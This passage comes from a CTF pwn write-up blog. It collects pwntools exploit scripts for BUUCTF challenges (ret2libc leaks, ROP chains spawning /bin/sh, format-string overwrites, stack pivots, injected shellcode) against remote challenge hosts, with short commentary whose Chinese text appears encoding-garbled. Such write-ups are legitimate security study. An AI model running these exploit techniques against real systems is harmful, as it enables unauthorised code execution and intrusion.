context.log_level = &#39;debug&#39;
#p=remote(&#39;node3.buuoj.cn&#39;,26681)
def cropy(payload):
	te=&#39;&#39;
	for a in (payload):
		i=ord(a)
		if  i &lt;= 0x60 or i &gt; 0x7A :
			if  i &lt;= 0x40 or i &gt; 0x5A :
				if  i &gt; 0x2F and i &lt;= 0x39 :
					i =i^ 0xF
			else:
				i = i^0xE
		else:
			i = i^0xD
		print i
		te=te+chr(i)
	print te
	return te

p.recvuntil(&#39;choice&#39;)
p.sendline(&#39;1&#39;)
p.recvuntil(&#39;encrypted&#39;)
got = elf.got[&quot;puts&quot;]
plt = elf.plt[&#39;puts&#39;]
payload = &#39;a&#39;*88+p64(0x400C83)+p64(got)+p64(plt)+p64(0x400B28)
co = cropy(payload)
p.sendline(co)
puts_got = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
base = puts_got - libc.symbols[&#39;puts&#39;]
one = base+0x4f322
payload = &#39;a&#39;*88+p64(one)
p.recvuntil(&#39;choice&#39;)
p.sendline(&#39;1&#39;)
p.recvuntil(&#39;encrypted&#39;)
co = cropy(payload)
p.sendline(co)
p.interactive()
</code></pre>
<p>python å¼‚æˆ–ä¸€ä¸‹,å­˜åœ¨æ ˆæº¢å‡ºæ³„éœ²åŸºå€,ç„¶åè¿”å› main å†æ¥ä¸€é,ä¹‹å one_gadget ç›´æ¥å‡º.æˆ‘æ˜¯å‚»é€¼,è§£è¿™é¢˜ 2&#x2F;3 æ—¶é—´éƒ½åœ¨çœ‹è‡ªå·±çš„å¼‚æˆ–å‡½æ•°å“ªæœ‰é—®é¢˜,æœ€åå‘ç°è‡ªå·±æƒ³å¤šäº†.å•Šå•Šå•Šå•Šå•Šå•Š,çœŸå¾— C è¯­è¨€æ€ä¹ˆå†™ python å°±æ€ä¹ˆå†™</p>
<p>##get_started_3dsctf_2016</p>
<pre><code>from pwn import *
from struct import pack
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context.log_level = &#39;debug&#39;
#io = process(&quot;./get_started_3dsctf_2016&quot;)
io = remote(&#39;node3.buuoj.cn&#39;,29153)
p = &#39;&#39;
p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; pop ecx ; pop ebx ; ret  
p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
p += &#39;/bin&#39;
p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax ; ret
p += &#39;//sh&#39;
p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0x08049463) # xor eax, eax ; ret
p += pack(&#39;&lt;I&#39;, 0x080557ab) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
p += pack(&#39;&lt;I&#39;, 0x0806fc31) # pop ecx ; pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebx
p += pack(&#39;&lt;I&#39;, 0x0806fc30) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0x080b91e6) # pop eax; ret
p += pack(&#39;&lt;I&#39;, 11) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806d7e5) # int 0x80
sleep(0.1)
#gdb.attach(io,&#39;b*0x08048A3B&#39;)
io.sendline(&#39;a&#39;*56+p)
io.interactive()
</code></pre>
<p>é™æ€ç¼–è¯‘çš„ç›´æ¥æ‰¾ rop å°±è¡Œ,ä½†æ˜¯è¿™é‡Œæœ‰ \x0a æˆªæ–­,åœ¨ p å­—ç¬¦ä¸²è¾“å…¥çš„æ—¶å€™æ³¨æ„ä¸€ä¸‹.è¿˜æœ‰ä¸€ç§ç›´æ¥ç”¨ mprotect ,ä¹Ÿè¡Œ</p>
<h2 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h2><pre><code>from pwn import *
#p = process(&#39;./pwn&#39;)
context.log_level = &#39;debug&#39;
#p=remote(&#39;node3.buuoj.cn&#39;,27693)
payload = fmtstr_payload(10, &#123;0x0804C044:123&#125;)
p.send(payload)
sleep(0.1)
p.sendline(&#39;123&#39;)
p.interactive()
</code></pre>
<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context.log_level = &#39;debug&#39;
#io = process(&quot;./r2t3&quot;)
io = remote(&#39;node3.buuoj.cn&#39;,29959)
elf = ELF(&quot;r2t3&quot;)
#libc=elf.libc
libc=ELF(&quot;libc-2.29.so&quot;)
got = elf.got[&quot;puts&quot;]
plt = elf.plt[&#39;puts&#39;]
io.recvuntil(&#39;name&#39;)
#gdb.attach(io,&#39;b*0x08048A3B&#39;)
payload = &#39;a&#39;*21+p32(plt)+p32(0x8048490)+p32(got)
payload = payload.ljust(260,&#39;a&#39;)

io.send(payload)
real = u32(io.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;puts&quot;]
print hex(libc_base)
system = libc.symbols[&quot;system&quot;] + libc_base
sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
payload = &#39;a&#39;*21+p32(system)+p32(0xdeadbeef)+p32(sh)
payload = payload.ljust(516,&#39;a&#39;)
#gdb.attach(io,&#39;b*0x80485DE&#39;)
io.send(payload)
io.interactive()
</code></pre>
<p>ä»€ä¹ˆ??æœ‰åé—¨??æœ‰æ„æ€å—</p>
<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#39;&#123;&#123;print $1&#125;&#125;&#39;&quot;.format(p.pid)).readlines()[1], 16)
		gdb.attach(p,&#39;b *&#123;&#125;&#39;.format(hex(text_base+addr)))
	else:
		gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))
context.log_level = &#39;debug&#39;
#p = process(&quot;./ciscn_2019_n_8&quot;)
p = remote(&#39;node3.buuoj.cn&#39;,26250)
elf = ELF(&quot;ciscn_2019_n_8&quot;)
libc=elf.libc
p.recvuntil(&#39;name?&#39;)
#debug(0x000012DC)
p.sendline(&#39;a&#39;*13*4+&#39;\x11&#39;)
p.interactive()
</code></pre>
<p>æˆ‘æ˜¯å‚»é€¼,è¿™é¢˜é€»è¾‘çœ‹é”™äº†,ä»¥ä¸ºæ€ä¹ˆè¿™ä¹ˆéš¾â€¦è¿™ç§é¢˜å±å®æ²¡æ„æ€</p>
<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><pre><code>from pwn import *
from struct import pack
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
io = remote(&#39;node3.buuoj.cn&#39;,29951)
#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
# Padding goes here
p = &#39;&#39;

p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
p += &#39;/bin&#39;
p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
p += &#39;//sh&#39;
p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0) # @ .data 
p += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0)
p += pack(&#39;&lt;I&#39;, 0x080eb060)
p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
p += pack(&#39;&lt;I&#39;, 0xb)
p += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80
#gdb.attach(io,&#39;b*0x80489FB&#39;)
io.sendline(&#39;1&#39;*(0x2d)+p)
io.interactive()
</code></pre>
<p>åŠ ä¸Šä¹‹å‰æ¬ çš„ mprotect å§</p>
<pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
io = remote(&#39;node3.buuoj.cn&#39;,28199)
#io=process(&#39;./not_the_same_3dsctf_2016&#39;)
# Padding goes here
elf = ELF(&#39;not_the_same_3dsctf_2016&#39;)
p3_ret = 0x0806fcf0
#0x0806fcf0 : pop edx ; pop ecx ; pop ebx ; ret
payload = p32(0x0806ED40)+p32(p3_ret)+p32(0x080EC000)+p32(1000)+p32(7)+p32(0x0806E200)+p32(0x080EC000)+p32(0)+p32(0x080EC000)+p32(50)
io.sendline(&#39;1&#39;*(0x2d)+payload)
io.send(&#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;)
io.interactive()
</code></pre>
<p>å¦å¤–æœ¬é¢˜è¿˜æœ‰ä¸ªåé—¨å‡½æ•°,é‚£ä¸ª wp å°±ä¸å†™äº†</p>
<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./patched&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,25577)
elf = ELF(&#39;./patched&#39;)
#libc = elf.libc
payload =&#39;a&#39;*24 +p64(0x400683)+p64(0x601048)+p64(0x4005E3)
p.sendline(payload)
p.interactive()
</code></pre>
<p>æ‹¿ shell å, flag å‘¢(ç¾äººé±¼é‚“è¶…çŠ¶ : å¤´å‘¢)??</p>
<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p=remote(&#39;node3.buuoj.cn&#39;,28535)
payload =&#39;a&#39;*136 +p64(0x400596)
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./one_gadget&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,28330)
elf = ELF(&#39;./one_gadget&#39;)
#libc = elf.libc
libc=ELF(&#39;libc-2.29.so&#39;)
context.log_level = &#39;debug&#39;
p.recvuntil(&#39;u:0x&#39;)
printf = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
print printf
libc_base = printf - libc.symbols[&#39;printf&#39;]
print hex(libc_base)
one = libc_base+0x106ef8
print one
p.sendline(str(one))
p.interactive()
</code></pre>
<p>æ²¡å•¥è¯´çš„, one_gadget è§£å†³</p>
<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p=remote(&#39;node3.buuoj.cn&#39;,29291)
payload =&#39;a&#39;*140 +p32(0x804845C)+p32(0x0804A024)
#payload =&#39;a&#39;*140 +p32(0x8048320)+p32(0)+p32(0x0804A024)
#.plt:08048320 _system         proc near
p.sendline(payload)
p.interactive()
</code></pre>
<p>åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€ä¸ªæˆ‘ä¹‹å‰ä¸€ç›´æ²¡æ³¨æ„çš„çŸ¥è¯†ç‚¹,äº‹å®ä¸Šåœ¨è¿™é‡Œä¸¤ä¸ª payload éƒ½èƒ½ç”¨,åœ¨ plt ä¸­æ‰æ˜¯çœŸæ­£æ»¡è¶³ä¸­é—´å¤¹æ‚è¿”å›åœ°å€çš„æƒ…å†µ,å¦‚æœæŠŠ ret å˜æˆå‡½æ•°ä¸­çš„åœ°å€ç›´æ¥å¾€æ ˆé‡Œå†™å°±å¯¹äº†</p>
<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./babyrop2&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,25183)
elf = ELF(&#39;./babyrop2&#39;)
#libc = elf.libc
libc = ELF(&#39;libc.so.6&#39;)
got = elf.got[&quot;read&quot;]
plt = elf.plt[&#39;printf&#39;]
format_s = 0x0400770
payload =&#39;a&#39;*40 +p64(0x400733)+p64(format_s)+p64(0x400731)+p64(got)+p64(0)+p64(plt)+p64(0x400636)
#0x0000000000400731 : pop rsi ; pop r15 ; ret
p.recvuntil(&#39;name?&#39;)

p.sendline(payload)
printf = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
libc_base = printf - libc.symbols[&#39;read&#39;]
print hex(libc_base)
system = libc.symbols[&quot;system&quot;] + libc_base
sh = libc_base+libc.search(&quot;/bin/sh&quot;).next()
one = libc_base+0x4526a
payload =&#39;a&#39;*40 +p64(one)+p64(0)*8
p.sendline(payload)
p.interactive()
</code></pre>
<p>åœ¨è¿™æœ‰ä¸ªé—®é¢˜, æˆ‘æƒ³æŠŠ printf åœ°å€ç”¨è‡ªå·± printf å‡ºæ¥å¤±è´¥äº†,ä½†æ˜¯ read æ˜¯å¥½ä½¿çš„???</p>
<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./ciscn_s_3&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,26843)
elf = ELF(&#39;./ciscn_s_3&#39;)
libc = elf.libc
#libc = ELF(&#39;libc.so.6&#39;)
payload = &#39;a&#39;*16+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x40059B)+p64(0)*5+p64(0x400503)+p64(0x4004F1)
&#39;&#39;&#39;
.text:00000000004004EB                 pop     rbp
.text:00000000004004EC                 retn
&#39;&#39;&#39;
#gdb.attach(p,&#39;b*0x40059B&#39;)
p.sendline(payload)
off = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
base = off-0x401733
one = base+0x4f322
payload = &#39;a&#39;*16+p64(one)+p64(0)*10
p.sendline(payload)
p.interactive()
</code></pre>
<p>è¿™ç§åŸºæœ¬ä¸é™åˆ¶è¾“å…¥çš„ one_gadget é€šæ€</p>
<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><pre><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./ciscn_2019_ne_5&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,28485)
context.log_level = &#39;debug&#39;
elf = ELF(&#39;./ciscn_2019_ne_5&#39;)
#libc = elf.libc
libc = ELF(&#39;./libc-2.27.so&#39;)
got = elf.got[&quot;printf&quot;]
print hex(got)
plt = elf.plt[&#39;puts&#39;]
print hex(plt)
payload =&#39;2&#39;*76 +p32(plt)+p32(0x8048722)+p32(got)
p.sendlineafter(&#39;password&#39;,&#39;administrator&#39;)
p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
p.sendlineafter(&#39;info:&#39;,payload)
p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;printf&quot;]
print hex(libc_base)
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
print hex(sh)
payload = &#39;2&#39;*76 +p32(0x080486B9)+p32(sh)
p.sendline(&#39;administrator&#39;)
p.sendlineafter(&#39;:&#39;,&#39;1&#39;)
p.sendlineafter(&#39;info:&#39;,payload)
print hex(libc_base)
print hex(sh)
p.sendlineafter(&#39;:&#39;,&#39;4&#39;)
p.interactive()
</code></pre>
<p>å¤ªå°´å°¬äº†,æˆ‘æŠŠ 64 ä½ so ä¸‹è½½ä¸‹æ¥æµ‹åç§»æµ‹äº†åŠå¤©â€¦ç„¶ååœ¨æ— èŠåœ¨ç½‘ä¸Šçœ‹ wp æ‰¾ä¼˜åŒ–çš„æ—¶å€™ç¬¬ä¸€æ¬¡çŸ¥é“è¿™ç§éªšæ“ä½œ,æ ¹æ®å‡½æ•°åæœ‰ sh æ¥ getshell ,å¤ªç§’äº†</p>
<pre><code>from pwn import *
r=remote(&#39;node3.buuoj.cn&#39;,25488)
e=ELF(&#39;ciscn_2019_ne_5&#39;)
sys_plt=e.plt[&#39;system&#39;]
sh_addr=0x80482ea
r.recvuntil(&#39;Please input admin password:&#39;)
r.sendline(&#39;administrator&#39;)
r.recvuntil(&#39;0.Exit\n:&#39;)
r.sendline(&#39;1&#39;)
payload=&#39;a&#39;*0x4c+p32(sys_plt)+&#39;aaaa&#39;+p32(sh_addr)
r.recvuntil(&#39;Please input new log info:&#39;)
r.sendline(payload)
r.recvuntil(&#39;0.Exit\n:&#39;)
r.sendline(&#39;4&#39;)
r.interactive()
&#39;&#39;&#39;
LOAD:080482E6 byte_80482E6    db 66h                  ; DATA XREF: LOAD:0804820Câ†‘o
LOAD:080482E7                 db  66h ; f
LOAD:080482E8                 db  6Ch ; l
LOAD:080482E9                 db  75h ; u
LOAD:080482EA                 db  73h ; s
LOAD:080482EB                 db  68h ; h
LOAD:080482EC                 db    0
&#39;&#39;&#39;
</code></pre>
<h2 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h2><pre><code>from pwn import*
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
#p = process(&#39;./pwn2_sctf_2016&#39;)
elf=ELF(&#39;./pwn2_sctf_2016&#39;)
context.log_level = &#39;debug&#39;
p=remote(&#39;node3.buuoj.cn&#39;,28578)
#libc = elf.libc
libc = ELF(&#39;libc-2.23.so&#39;)
got=elf.got[&#39;atoi&#39;]
plt=elf.plt[&#39;printf&#39;]
p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)
#gdb.attach(p,&#39;b*0x80485A2&#39;)
#p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(0x804852F)*3)
p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(plt)+p32(0x804852F)+p32(0x80486F8)+p32(got))
real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;atoi&quot;]
print hex(libc_base)
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
print hex(sh)
sys = libc_base + libc.symbols[&quot;system&quot;]
one = libc_base+0x3a80c
p.sendlineafter(&#39;read?&#39;,&#39;-1&#39;)

p.sendlineafter(&#39;data&#39;,&#39;a&#39;*48+p32(sys)+p32(sh)*2)
p.interactive()
</code></pre>
<p>è¿™é¢˜å¥—è·¯æ€§å¤ªå¼ºäº†,ä¸€çœ‹<code>int __cdecl get_n(int a1, unsigned int a2)</code>å°±çŸ¥é“è€æ±Ÿæ¹–äº†</p>
<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><pre><code>from pwn import*
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
elf=ELF(&#39;./ez_pz_hackover_2016&#39;)
context.log_level = &#39;debug&#39;
#p = process(&#39;./ez_pz_hackover_2016&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,29043)
libc = elf.libc
#libc = ELF(&#39;libc-2.23.so&#39;)
p.recvuntil(&#39;0x&#39;)
recv = int(p.recvuntil(&#39;\n&#39;)[:-1],16)
#gdb.attach(p,&#39;b*0x80485F8&#39;)
shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;
p.sendline(&#39;crashme\x00&#39;+&#39;a&#39;*14+p32(recv-0x1c)*2+shellcode)
p.interactive()
</code></pre>
<h2 id="Black-Watch-å…¥ç¾¤é¢˜-PWN"><a href="#Black-Watch-å…¥ç¾¤é¢˜-PWN" class="headerlink" title="[Black Watch å…¥ç¾¤é¢˜]PWN"></a>[Black Watch å…¥ç¾¤é¢˜]PWN</h2><pre><code>from pwn import*
#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
elf=ELF(&#39;./spwn&#39;)
context.log_level = &#39;debug&#39;
#p = process(&#39;./spwn&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,26668)
#libc = elf.libc
libc=ELF(&#39;libc-2.23.so&#39;)
got=elf.got[&#39;write&#39;]
plt=elf.plt[&#39;write&#39;]
payload = &#39;c&#39;*4+p32(plt)+p32(0x08048513)+p32(1)+p32(got)+p32(4)
p.sendafter(&#39;Ctfer&#39;,payload)
p.sendafter(&#39;say&#39;,&#39;a&#39;*24+p32(0x804A300)+p32(0x8048511))
real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;write&quot;]
print hex(libc_base)
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
print hex(sh)
sys = libc_base+libc.symbols[&quot;system&quot;]
p.recvuntil(&#39;name&#39;)
p.send(p32(sys)+p32(0)+p32(sh))
#300
one = libc_base+0x5f066
leave = 0x8048511
p.recvuntil(&#39;say?&#39;)

p.send(&#39;a&#39;*24+p32(0x804a300-4)+p32(leave))
#p.sendline(&#39;a&#39;*32)
p.interactive()
</code></pre>
<p>è¿™é¢˜è¯´æ¥æƒ­æ„§,çœ‹åå­— spwn æˆ‘ä»¥ä¸ºæ˜¯ srop ,å“å¾—æˆ˜æˆ˜å…¢å…¢çš„åš,ç»“æœå°±æ˜¯ä¸ªæ ˆè¿ç§»,å“,å¤ªæ€‚äº†~~~</p>
<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><pre><code>from pwn import*
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
elf=ELF(&#39;./bjdctf_2020_babystack&#39;)
context.log_level = &#39;debug&#39;
#p = process(&#39;./bjdctf_2020_babystack&#39;)
p=remote(&#39;node3.buuoj.cn&#39;,28764)
libc = elf.libc
#libc = ELF(&#39;libc-2.23.so&#39;)
p.sendlineafter(&#39;length&#39;,&#39;100&#39;)
#gdb.attach(p,&#39;b*0x4006E6&#39;)
p.sendlineafter(&#39;name?&#39;,&#39;a&#39;*24+p64(0x04006E6))
p.interactive()
</code></pre>
<hr>
<p>4.10 å‰åŠ³åŠ¨æˆæœ</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><pre><code>from pwn import *
#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context.log_level = &#39;debug&#39;
#p = process(&#39;./ciscn_2019_es_2&#39;)
p = remote(&quot;node3.buuoj.cn&quot;,28704)
elf = ELF(&#39;./ciscn_2019_es_2&#39;)
libc=elf.libc
pay = &#39;a&#39;*(32)
p.send(pay)
leak = u32(p.recvuntil(&#39;\xff&#39;)[-4:])
leak = leak-228-4
leave = 0x8048562
#gdb.attach(p,&#39;b*0x080485FE&#39;)
payload = p32(0x8048559)+p32(leak+12)+&#39;/bin/sh\x00&#39;+&#39;a&#39;*(40-12-4)+p32(leak)+p32(leave)
p.send(payload)
p.interactive()
</code></pre>
<p>ç¬¬ä¸€æ¬¡æ³„éœ²æ ˆåœ°å€,ä¹‹åä¸€ä¸ªæ ˆè¿ç§»</p>
<h2 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h2><pre><code>from pwn import *
context.log_level = &#39;debug&#39;
context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
p = process(&#39;./2018_rop&#39;)
#p = remote(&quot;node3.buuoj.cn&quot;,28557)
elf = ELF(&#39;./2018_rop&#39;)
libc=elf.libc
#libc = ELF(&#39;libc-2.27.so&#39;)
got=elf.got[&#39;getegid&#39;]
plt=elf.plt[&#39;write&#39;]
pay = &#39;c&#39;*140+p32(plt)+p32(0x08048474)+p32(1)+p32(got)+p32(4)
p.sendline(pay)
real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;getegid&quot;]
print hex(libc_base)
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
print hex(sh)
sys = libc_base+libc.symbols[&quot;system&quot;]
pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
p.sendline(pay)
p.interactive()
</code></pre>
<h2 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h2><pre><code>from pwn import *
context.log_level = &#39;debug&#39;
context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
#p = process(&#39;./level3&#39;)
p = remote(&quot;node3.buuoj.cn&quot;,25480)
elf = ELF(&#39;./level3&#39;)
#libc=elf.libc
libc = ELF(&#39;libc-2.23.so&#39;)
got=elf.got[&#39;write&#39;]
plt=elf.plt[&#39;write&#39;]
pay = &#39;c&#39;*140+p32(plt)+p32(0x804844B)+p32(1)+p32(got)+p32(4)
p.recvuntil(&#39;Input:&#39;)
p.sendline(pay)
real = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
libc_base = real - libc.symbols[&quot;write&quot;]
print hex(libc_base)
sh = libc_base+libc.search(&quot;/bin/sh\x00&quot;).next()
print hex(sh)
sys = libc_base+libc.symbols[&quot;system&quot;]
pay = &#39;c&#39;*140+p32(sys)+p32(0)+p32(sh)
p.sendline(pay)
p.interactive()
</code></pre>
<h2 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h2><pre><code>from pwn import *
context.log_level = &#39;debug&#39;
context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,word_size=&#39;64&#39;)
p = process(&#39;./r2t4&#39;)
#p = remote(&quot;node3.buuoj.cn&quot;,27166)
elf = ELF(&#39;./r2t4&#39;)
__stack_chk_fail = elf.got[&#39;__stack_chk_fail&#39;]
gdb.attach(p,&#39;b*0x4006B3&#39;)
pay = &quot;%1574c%8$hnaaaaa&quot;+ p64(__stack_chk_fail)+&#39;a&#39;*20
p.sendline(pay)
p.interactive()
</code></pre>
<p>æ²¡å•¥è¯´çš„,æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><pre><code>#coding:utf-8
